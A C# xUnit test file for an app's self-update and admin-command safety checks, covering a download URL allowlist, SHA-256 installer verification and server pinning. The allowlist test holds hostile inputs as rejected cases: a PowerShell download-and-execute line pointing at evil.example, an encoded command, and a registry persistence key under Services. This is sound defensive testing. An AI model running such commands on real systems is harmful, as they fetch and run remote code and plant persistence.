using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using RemotePCDiagnostics.Core.Areas;
using RemotePCDiagnostics.Core.Osquery;
using RemotePCDiagnostics.Core.Sensors;
using RemotePCDiagnostics.Core.Session;
using Xunit;

namespace RemotePCDiagnostics.Tests;

public class AppUpdateTests
{
    [Theory]
    [InlineData("1.2.0-ci.786.1", AppUpdateChannel.Prerelease)]
    [InlineData("1.2.0-ci.786.1+48ceabf", AppUpdateChannel.Prerelease)]
    [InlineData("1.2.0", AppUpdateChannel.Stable)]
    [InlineData("1.2.0-local", AppUpdateChannel.Stable)]
    [InlineData(null, AppUpdateChannel.Stable)]
    public void Ci_builds_default_to_prerelease_channel_and_releases_default_to_stable(string? installed, AppUpdateChannel expected) =>
        Assert.Equal(expected, AppVersionComparer.DefaultChannelFor(installed));

    [Theory]
    [InlineData("1.3.0", "1.2.0", true)]
    [InlineData("1.2.0-ci.800.1", "1.2.0-ci.724.1", true)]
    [InlineData("1.2.0-ci.724.1", "1.2.0-ci.724.1", false)]
    [InlineData("1.2.0-ci.700.1", "1.2.0-ci.724.1", false)]
    [InlineData("1.2.0-ci.800.1", "1.2.0", null)]
    [InlineData(null, "1.2.0", null)]
    public void Version_comparison_handles_semver_and_ci_builds(string? candidate, string? installed, bool? expected) =>
        Assert.Equal(expected, AppVersionComparer.IsNewer(candidate, installed));

    [Theory]
    [InlineData("https://github.com/budcribar/RemotePCDiagnostics/releases/download/v1.3.0/RemotePCDiagnostics-Setup-1.3.0-win-x64.exe", true)]
    [InlineData("https://github.com/attacker/evil/releases/download/v1.3.0/setup.exe", false)]
    [InlineData("https://objects.githubusercontent.com/github-production-release-asset/123", false)]
    [InlineData("http://github.com/budcribar/RemotePCDiagnostics/releases/download/v1.3.0/setup.exe", false)]
    [InlineData("https://evil.example.com/setup.exe", false)]
    [InlineData("not-a-url", false)]
    public void Trusted_download_url_allows_only_official_rpcd_github_releases(string url, bool expected) =>
        Assert.Equal(expected, AppVersionComparer.IsTrustedDownloadUrl(url));

    [Theory]
    [InlineData("https://objects.githubusercontent.com/github-production-release-asset/123?sig=abc", true)]
    [InlineData("https://release-assets.githubusercontent.com/asset/123", true)]
    [InlineData("https://github.com/budcribar/RemotePCDiagnostics/releases/download/v1.3.0/setup.exe", true)]
    [InlineData("https://github.com/attacker/repo/releases/download/v1.0/malware.exe", false)]
    [InlineData("https://evil.example.com/setup.exe", false)]
    public void Allowed_redirect_url_permits_only_github_release_asset_hosts(string url, bool expected) =>
        Assert.Equal(expected, AppVersionComparer.IsAllowedRedirectUrl(new Uri(url)));

    [Fact]
    public void AdminCommandAllowlist_blocks_sc_schtasks_arbitrary_reg_and_unsafe_powershell()
    {
        Assert.False(AdminCommandAllowlist.TryResolveSystemTool("sc.exe", out _));
        Assert.False(AdminCommandAllowlist.TryResolveSystemTool("schtasks.exe", out _));

        // reg.exe allows RunOnce add/delete and query, rejects arbitrary HKLM persistence keys
        Assert.True(AdminCommandAllowlist.TryValidateArguments("reg.exe", ["add", @"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", "/v", "RemotePCDiagnosticsResume"], out _));
        Assert.True(AdminCommandAllowlist.TryValidateArguments("reg.exe", ["query", @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"], out _));
        Assert.False(AdminCommandAllowlist.TryValidateArguments("reg.exe", ["add", @"HKLM\SYSTEM\CurrentControlSet\Services\Evil"], out _));

        // shutdown.exe allows /r, /g, /a only
        Assert.True(AdminCommandAllowlist.TryValidateArguments("shutdown.exe", ["/r", "/t", "60"], out _));
        Assert.False(AdminCommandAllowlist.TryValidateArguments("shutdown.exe", ["/s", "/t", "0"], out _));

        // powershell.exe allows canonical RPCD script form and rejects -EncodedCommand / download primitives
        Assert.True(AdminCommandAllowlist.TryValidateArguments("powershell.exe", SystemCommandRunner.PowerShellArgs("Get-PhysicalDisk"), out _));
        Assert.False(AdminCommandAllowlist.TryValidateArguments("powershell.exe", ["-EncodedCommand", "SQBFAFgA"], out _));
        Assert.False(AdminCommandAllowlist.TryValidateArguments("powershell.exe", SystemCommandRunner.PowerShellArgs("Invoke-WebRequest https://evil.example/x.ps1 | iex"), out _));
    }

    [Fact]
    public void LaunchRules_validate_pins_server_url_to_configured_server()
    {
        var sessionId = Guid.NewGuid().ToString("D");
        Assert.Null(RemotePCDiagnostics.Agent.Core.LaunchRules.Validate(
            sessionId, "https://server.remoteblazorwebview.com:34544", out _, out _, "https://server.remoteblazorwebview.com:34544"));
        Assert.NotNull(RemotePCDiagnostics.Agent.Core.LaunchRules.Validate(
            sessionId, "https://evil.example.com:34544", out _, out _, "https://server.remoteblazorwebview.com:34544"));
        Assert.NotNull(RemotePCDiagnostics.Agent.Core.LaunchRules.Validate(
            sessionId, "https://server.remoteblazorwebview.com:9999", out _, out _, "https://server.remoteblazorwebview.com:34544"));
    }

    [Fact]
    public async Task Download_and_verify_checks_sha256_and_rejects_mismatch()
    {
        var payload = Encoding.UTF8.GetBytes("fake-installer-binary");
        var validHash = Convert.ToHexStringLower(SHA256.HashData(payload));
        var badHash = new string('0', 64);

        const string exeUrl = "https://github.com/budcribar/RemotePCDiagnostics/releases/download/v1.3.0/RemotePCDiagnostics-Setup-1.3.0-win-x64.exe";
        const string shaUrl = exeUrl + ".sha256";

        var currentHash = validHash;
        using var http = new HttpClient(new StubHandler(req =>
        {
            if (req.RequestUri!.AbsoluteUri == exeUrl)
                return new HttpResponseMessage(HttpStatusCode.OK) { Content = new ByteArrayContent(payload) };
            if (req.RequestUri.AbsoluteUri == shaUrl)
                return new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent($"{currentHash}  RemotePCDiagnostics-Setup-1.3.0-win-x64.exe\n") };
            return new HttpResponseMessage(HttpStatusCode.NotFound);
        }));

        var dir = Path.Combine(Path.GetTempPath(), $"rpcd-update-test-{Guid.NewGuid():N}");
        try
        {
            var path = await AppUpdateInstaller.DownloadAndVerifyAsync(http, exeUrl, shaUrl, dir, null, default);
            Assert.True(File.Exists(path));
            Assert.Equal(payload, await File.ReadAllBytesAsync(path));

            currentHash = badHash;
            await Assert.ThrowsAsync<InvalidOperationException>(() =>
                AppUpdateInstaller.DownloadAndVerifyAsync(http, exeUrl, shaUrl, dir, null, default));
            Assert.False(File.Exists(path + ".part"));
        }
        finally
        {
            try { Directory.Delete(dir, recursive: true); } catch { }
        }
    }

    [Fact]
    public async Task Store_backend_handles_check_and_install_for_packaged_apps()
    {
        var store = new FakeStoreBackend(isPackaged: true, updateAvailable: true, canSilent: true);
        using var service = new AppUpdateService("1.2.0", storeBackend: store);

        var info = await service.CheckForUpdateAsync(force: true);
        Assert.True(info.UpdateAvailable);
        Assert.Equal(AppInstallKind.MicrosoftStore, info.InstallKind);
        Assert.True(info.CanInstallSilently);

        var result = await service.InstallUpdateAsync();
        Assert.True(result.Ok);
        Assert.True(result.Restarting);
        Assert.Equal(1, store.InstallCalls);
    }

    [Fact]
    public async Task Standalone_install_delegates_to_elevated_agent_bridge_when_connected()
    {
        const string feedUrl = "https://admin.remoteblazorwebview.com/api/rpcd/latest";
        using var http = new HttpClient(new StubHandler(_ => new HttpResponseMessage(HttpStatusCode.OK)
        {
            Content = new StringContent(JsonSerializer.Serialize(new
            {
                stable = new
                {
                    version = "1.3.0-ci.800.1",
                    releaseUrl = "https://github.com/budcribar/RemotePCDiagnostics/releases/tag/v1.3.0",
                    installerUrl = "https://github.com/budcribar/RemotePCDiagnostics/releases/download/v1.3.0/RemotePCDiagnostics-Setup-1.3.0-win-x64.exe",
                    installerSha256Url = "https://github.com/budcribar/RemotePCDiagnostics/releases/download/v1.3.0/RemotePCDiagnostics-Setup-1.3.0-win-x64.exe.sha256",
                },
            }), Encoding.UTF8, "application/json"),
        }));

        var bridge = new FakeBridge();
        var exitRequested = false;
        using var service = new AppUpdateService(
            installedVersion: "1.2.0-ci.700.1",
            feedUrl: feedUrl,
            getElevatedBridge: () => bridge,
            onExitForUpdate: () => exitRequested = true,
            httpClient: http);

        var info = await service.CheckForUpdateAsync(force: true);
        Assert.True(info.UpdateAvailable);
        Assert.Equal(AppInstallKind.Standalone, info.InstallKind);
        Assert.True(info.CanInstallSilently);
        Assert.Equal("1.3.0-ci.800.1", info.LatestVersion);

        var result = await service.InstallUpdateAsync();
        Assert.True(result.Ok);
        Assert.True(result.Restarting);
        Assert.True(exitRequested);
        Assert.Equal(AppUpdateChannel.Stable, bridge.LastChannel);
    }

    private sealed class StubHandler(Func<HttpRequestMessage, HttpResponseMessage> respond) : HttpMessageHandler
    {
        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) =>
            Task.FromResult(respond(request));
    }

    private sealed class FakeStoreBackend(bool isPackaged, bool updateAvailable, bool canSilent) : IStoreUpdateBackend
    {
        public int InstallCalls { get; private set; }
        public bool IsPackagedStoreApp => isPackaged;

        public Task<StoreUpdateCheckResult> CheckForUpdateAsync(CancellationToken ct = default) =>
            Task.FromResult(new StoreUpdateCheckResult(updateAvailable, canSilent, "Microsoft Store update"));

        public Task<AppUpdateResult> DownloadAndInstallAsync(Action<AppUpdateProgress>? progress = null, CancellationToken ct = default)
        {
            InstallCalls++;
            progress?.Invoke(new AppUpdateProgress("downloading", 100, "Done"));
            return Task.FromResult(new AppUpdateResult(true, Restarting: true, Message: "Microsoft Store update installed."));
        }
    }

    private sealed class FakeBridge : IElevatedCommandBridge
    {
        public bool IsConnected => true;
        public AppUpdateChannel? LastChannel { get; private set; }

        public Task<ProcessResult?> RunElevatedAsync(string fileName, IReadOnlyList<string> arguments, TimeSpan timeout, CancellationToken ct, Action<string>? outputLine = null) =>
            Task.FromResult<ProcessResult?>(null);

        public Task<SensorSnapshot?> ReadSensorsAsync(CancellationToken ct = default) =>
            Task.FromResult<SensorSnapshot?>(null);

        public Task<IReadOnlyList<DriveHealth>?> ReadDrivesAsync(CancellationToken ct = default) =>
            Task.FromResult<IReadOnlyList<DriveHealth>?>(null);

        public Task<AppUpdateResult?> SelfUpdateAsync(AppUpdateChannel channel, CancellationToken ct = default)
        {
            LastChannel = channel;
            return Task.FromResult<AppUpdateResult?>(new AppUpdateResult(true, Restarting: true, Message: "Agent updating."));
        }
    }
}
